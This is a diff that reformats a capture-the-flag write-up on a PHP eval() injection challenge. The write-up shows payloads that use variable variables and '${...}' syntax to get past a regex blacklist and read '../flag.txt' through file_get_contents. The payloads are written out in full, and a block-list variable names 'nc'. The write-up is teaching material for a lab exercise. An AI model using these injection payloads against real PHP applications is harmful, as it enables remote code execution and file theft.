@@ -10,11 +10,11 @@ When submitting the form, the input is wrapped around an `echo` statement and ad
 
 The first thing we tried was to modify the GET parameter to test for arbitrary code execution:
 
-```text
+```
 print=echo+'';phpinfo()
 ```
 
-![](../../.gitbook/assets/image%20%2813%29.png)
+![](<../../.gitbook/assets/image (12).png>)
 
 By checking the `debug` option, we are presented with the page's source code. The following code implements the input blacklist and the `eval()` vulnerability:
 
@@ -50,7 +50,7 @@ $hello = 'The Output';
 echo $$foo; // displays "The Output"
 ```
 
-What happens here is that the value of  `$foo` is used as a variable name, and so `$$foo` becomes `$hello` \(think of it as replacing `$foo` in `$$foo`\).
+What happens here is that the value of  `$foo` is used as a variable name, and so `$$foo` becomes `$hello` (think of it as replacing `$foo` in `$$foo`).
 
 ```php
 $special_block= "nc";
@@ -61,7 +61,7 @@ Here, the value of `$special_block` is used as a variable name. The second line 
 
 Our final payload is
 
-```text
+```
 ?print=echo+'';print(eval('return ${blocked}[4](${nc});'))
 ```
 
@@ -71,5 +71,4 @@ which leads to the following code being `eval`-ed:
 print(eval('return file_get_contents("../flag.txt");')
 ```
 
-Note that `$[a-zA-Z]` is blocked in the regex, so we must use `${...}` instead \(which achieves the same purpose\). Also, `eval()` executes `file_get_contents("../flag.txt")` but doesn't display anything to us yet. By returning and printing the output, we retrieve the flag.
-
+Note that `$[a-zA-Z]` is blocked in the regex, so we must use `${...}` instead (which achieves the same purpose). Also, `eval()` executes `file_get_contents("../flag.txt")` but doesn't display anything to us yet. By returning and printing the output, we retrieve the flag.
